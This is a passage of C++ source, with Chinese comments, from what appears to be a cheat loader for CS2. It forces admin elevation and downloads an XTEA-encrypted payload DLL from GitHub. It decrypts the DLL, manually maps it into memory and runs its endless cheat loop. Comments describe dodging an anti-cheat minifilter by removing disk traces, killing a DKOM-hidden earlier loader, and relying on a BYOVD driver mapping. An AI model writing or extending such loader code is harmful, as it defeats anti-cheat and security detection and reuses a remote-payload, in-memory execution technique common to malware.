                                                LoaderDiag("FIX25: killed old loader pid=%u (NtQSI, was DKOM hidden)\n", pid32);
                                                killedByNtQSI++;
                                            }
                                        }
                                    }
                                    CloseHandle(hOld);
                                }
                            }
                            if (spi->NextEntryOffset == 0) break;
                            p += spi->NextEntryOffset;
                        }
                        if (killedByNtQSI == 0) {
                            LoaderDiag("FIX25: NtQSI found no old loader (clean startup)\n");
                        }
                    } else {
                        LoaderDiag("FIX25: NtQuerySystemInformation failed status=0x%08X retLen=%u\n", (unsigned)status, retLen);
                    }
                }
            }
        }
    }

    // v3.37: 强制管理员权限 — 自动以 runas + --elevated 重新启动
    LoaderDiag("STEP1: EnsureAdminPrivileges...\n");
    EnsureAdminPrivileges();

    // ★ BUILD 551: 移除 WriteBasicToTemp 代码块 — basic.exe 已在 BUILD 548 集成到 payload.dll
    //   原代码 (L480-499) 通过 EMBEDDED_BASIC_EXE 数据将 basic_esp.exe 写入 %TEMP%,
    //   但 payload.dll BUILD 548+ 已移除 basic.exe 启动逻辑,该文件成为磁盘痕迹,
    //   被 PAC minifilter (MessageTransfer.sys) 扫描发现 → 检测概率 30%+
    //   清理: embedded_basic_loader.h 已删除,EMBEDDED_BASIC_EXE 数据不再嵌入 loader.exe

    // --- 1. 从 GitHub 下载 Payload ---
    LoaderDiag("STEP3: DownloadPayload...\n");
    std::vector<uint8_t> encryptedData = DownloadPayload();

    if (encryptedData.size() < 8) {
        LoaderDiag("STEP3: FAILED (size=%zu)\n", encryptedData.size());
        MessageBoxW(NULL,
            L"Payload 下载失败。\n\n"
            L"可能原因:\n"
            L"  - 网络连接不可用\n"
            L"  - GitHub 访问受限\n"
            L"  - 防火墙拦截\n\n"
            L"请检查网络后重试。",
            L"下载失败", MB_OK | MB_ICONERROR);
        return 1;
    }
    LoaderDiag("STEP3: OK (%zu bytes)\n", encryptedData.size());

    // --- 2. 解密 Payload ---
    LoaderDiag("STEP4: DecryptPayload...\n");
    uint32_t originalSize = *reinterpret_cast<uint32_t*>(encryptedData.data());
    size_t encryptedPayloadSize = encryptedData.size() - sizeof(uint32_t);

    // ★ v3.69: 校验 payload 下界 (至少需要完整 PE 头, 1 页面)
    if (originalSize < 0x1000 || originalSize > 100 * 1024 * 1024) {
        LoaderDiag("STEP4: FAILED (originalSize=%u)\n", originalSize);
        MessageBoxW(NULL, L"Payload 解密失败: 数据大小异常。",
            L"解密失败", MB_OK | MB_ICONERROR);
        return 2;
    }

    // ★ v3.111: 校验下载完整性 — 加密数据大小必须匹配
    //   加密格式: [4字节 originalSize] [XTEA加密数据, 8字节对齐]
    size_t expectedEncryptedSize = 4 + ((originalSize + 7) & ~7ULL);
    if (encryptedData.size() != expectedEncryptedSize) {
        LoaderDiag("STEP4: SIZE MISMATCH (got=%zu expected=%zu)\n",
            encryptedData.size(), expectedEncryptedSize);
        MessageBoxW(NULL,
            L"Payload 下载不完整，数据大小不匹配。\n\n"
            L"可能原因:\n"
            L"  - 网络中断导致下载不完整\n"
            L"  - GitHub 镜像代理返回了不完整数据\n"
            L"  - 文件被篡改\n\n"
            L"请重新运行 loader.exe 重试。",
            L"下载不完整", MB_OK | MB_ICONERROR);
        return 2;
    }

    uint8_t* payloadBuf = encryptedData.data() + sizeof(uint32_t);

    // XTEA CBC 解密 (原地)
    LoaderDiag("STEP4: decrypting %zu bytes...\n", encryptedPayloadSize);
    XteaDecryptCBC(payloadBuf, encryptedPayloadSize);
    LoaderDiag("STEP4: OK (decrypted size=%u)\n", originalSize);

    // --- 3. ManualMap 到当前进程 ---
    LoaderDiag("STEP5: MinimalManualMap (size=%u)...\n", originalSize);
    auto mapResult = MinimalManualMap(payloadBuf, originalSize);
    if (!mapResult.success) {
        LoaderDiag("STEP5: FAILED\n");
        MessageBoxW(NULL, L"Payload 内存加载失败 (ManualMap)。\n请确认系统兼容性。",
            L"加载失败", MB_OK | MB_ICONERROR);
        return 3;
    }
    LoaderDiag("STEP5: OK (base=0x%p size=%zu entry=0x%p)\n",
        mapResult.imageBase, mapResult.imageSize, mapResult.entryPoint);

    // ★ BUILD 558 FIX-3: 设置 payload.dll 基址/大小, 供 LoaderVehHandler 判断崩溃范围
    //   VEH 触发时通过此范围计算 "INSIDE payload" + offset, 用于精确定位崩溃函数
    g_payloadBase = mapResult.imageBase;
    g_payloadSize = mapResult.imageSize;
    LoaderDiag("STEP5.5: VEH range set [0x%p, +0x%zu) — LOADER-VEH will tag AV inside this range\n",
        g_payloadBase, g_payloadSize);

    // --- 0. ★ BUILD 567 v3.292: 移除 SelfDelete — 与 payload v3.291 infinite Sleep 冲突
    //   原因: payload.dll v3.291 在 CS2 退出后进入 infinite Sleep (避免 BYOVD driver
    //         映射蓝屏), loader.exe 进程必须保持运行. SelfDelete 删除运行中的 exe
    //         会导致进程退出时 driver 映射的物理内存被释放 → 蓝屏.
    //   替代: 用户手动管理 loader.exe (删除/改名), 或在系统重启时自动清理.
    LoaderDiag("STEP6: SelfDelete skipped (v3.292 — conflicts with infinite Sleep)\n");

    // --- 4. 调用 DllMain(DLL_PROCESS_ATTACH) ---
    // DllMain 在当前线程上直接运行 CheatMainLoop (不创建额外线程),
    // 从此处开始 loader.exe 进程进入无限循环, 永不返回

    // ★ BUILD 558 FIX-3: IAT 验证 — DllMain 调用前检查关键 IAT 条目
    //   崩溃现象: DllMain 调用后无 sd.log, WER 报告 c0000005 StackHash_0000 (unknown module)
    //   怀疑: loader MinimalManualMap IAT 解析失败, IAT[DisableThreadLibraryCalls]=0
    //         → DllMain @ 0x9aa0 第一个 IAT 调用 (0x9ad8: call *IAT[0x82778]) 立即崩溃
    //   验证: 读取 4 个关键 IAT 条目 (RVA 来自 objdump -p payload.dll)
    // ★ BUILD 567 v3.292: IAT RVA 已更新 (payload.dll 重新编译后 .idata 移到 0x8b000+)
    //     0x8b0f8 = AddVectoredExceptionHandler (KERNEL32.dll)
    //     0x8b188 = DisableThreadLibraryCalls (KERNEL32.dll) ← DllMain 第一个 IAT 调用
    //     0x8b3b8 = Sleep (KERNEL32.dll)
    //     0x8b428 = VirtualQuery (KERNEL32.dll)
    //   注意: RVA 硬编码, 重新编译 payload.dll 后需用 parse_iat.py 更新
    {
        auto* base = mapResult.imageBase;
        uintptr_t iatVEH   = *reinterpret_cast<uintptr_t*>(base + 0x8b0f8);
        uintptr_t iatDTLC  = *reinterpret_cast<uintptr_t*>(base + 0x8b188);
        uintptr_t iatSleep = *reinterpret_cast<uintptr_t*>(base + 0x8b3b8);
        uintptr_t iatVQ    = *reinterpret_cast<uintptr_t*>(base + 0x8b428);
        LoaderDiag("STEP6.5: IAT verify: VEH@0x8b0f8=0x%llX DTLC@0x8b188=0x%llX Sleep@0x8b3b8=0x%llX VQ@0x8b428=0x%llX\n",
            (unsigned long long)iatVEH, (unsigned long long)iatDTLC,
            (unsigned long long)iatSleep, (unsigned long long)iatVQ);
        if (iatVEH == 0 || iatDTLC == 0 || iatSleep == 0 || iatVQ == 0) {
            LoaderDiag("STEP6.5: *** WARNING *** IAT has NULL entries! DllMain will crash at first IAT call.\n");
            // 输出前 16 个 IAT 条目用于诊断
            for (int i = 0; i < 16; i++) {
                uintptr_t val = *reinterpret_cast<uintptr_t*>(base + 0x8b0f8 + i * 8);
                LoaderDiag("  IAT[0x%llX] = 0x%llX\n",
                    (unsigned long long)(0x8b0f8 + i * 8),
                    (unsigned long long)val);
            }
        }
    }

    LoaderDiag("STEP7: Calling DllMain @ 0x%p...\n", mapResult.entryPoint);
    using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
    auto dllMain = reinterpret_cast<DllMainFn>(mapResult.entryPoint);
    dllMain(reinterpret_cast<HINSTANCE>(mapResult.imageBase),
            DLL_PROCESS_ATTACH, nullptr);

    // 不会到达这里 (CheatMainLoop 永不返回)
    LoaderDiag("=== LOADER v3.38 END (unreachable) ===\n");
    return 0;
}
